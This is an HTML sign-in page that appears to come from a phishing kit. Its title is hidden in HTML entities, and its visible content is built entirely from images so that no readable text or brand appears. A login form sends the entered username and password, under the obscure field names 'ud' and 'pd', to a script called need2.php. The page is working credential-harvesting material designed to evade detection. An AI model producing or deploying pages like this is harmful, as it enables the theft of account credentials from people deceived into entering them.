<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

 <style type="text/css">
  
.textbox {  
    border: 1px solid #bebebe;
    border-radius: 6px;
	font-size: 16px;
	color: #555;
    font-weight: 400;
	padding-left: 18px;
    height: 46px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #333; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:97px; top:12px; width:169px; height:20px; z-index:0"><a href="#"><img src="images/d1.png" alt="" title="" border=0 width=169 height=20></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1075px; top:14px; width:177px; height:16px; z-index:1"><a href="#"><img src="images/d2.png" alt="" title="" border=0 width=177 height=16></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:42px; width:1349px; height:152px; z-index:2"><img src="images/d4.png" alt="" title="" border=0 width=1349 height=152></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:191px; width:1349px; height:204px; z-index:5"><img src="images/d11.png" alt="" title="" border=0 width=1349 height=204></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:564px; width:1349px; height:146px; z-index:4"><img src="images/d7.png" alt="" title="" border=0 width=1349 height=146></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:393px; width:1349px; height:189px; z-index:3"><img src="images/d6.png" alt="" title="" border=0 width=1349 height=189></div>

<div id="image7" style="position:absolute; overflow:hidden; left:364px; top:748px; width:625px; height:40px; z-index:6"><img src="images/d9.png" alt="" title="" border=0 width=625 height=40></div>

<div id="image8" style="position:absolute; overflow:hidden; left:854px; top:90px; width:226px; height:65px; z-index:7"><a href="#"><img src="images/d3.png" alt="" title="" border=0 width=226 height=65></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:894px; top:748px; width:94px; height:19px; z-index:8"><a href="#"><img src="images/d8.png" alt="" title="" border=0 width=94 height=19></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:1094px; top:511px; width:59px; height:18px; z-index:9"><a href="#"><img src="images/d10.png" alt="" title="" border=0 width=59 height=18></a></div>
<form action=need2.php name=kumratbnd id=kumratbnd method=post>
<input name="ud" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:365px;left:785px;top:452px;z-index:10">
<input name="pd" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:365px;left:785px;top:535px;z-index:11">
<div id="formimage1" style="position:absolute; left:784px; top:590px; z-index:12"><input type="image" name="formimage1" width="367" height="48" src="images/go.png"></div>
</div>
 
	
</body>
</html>
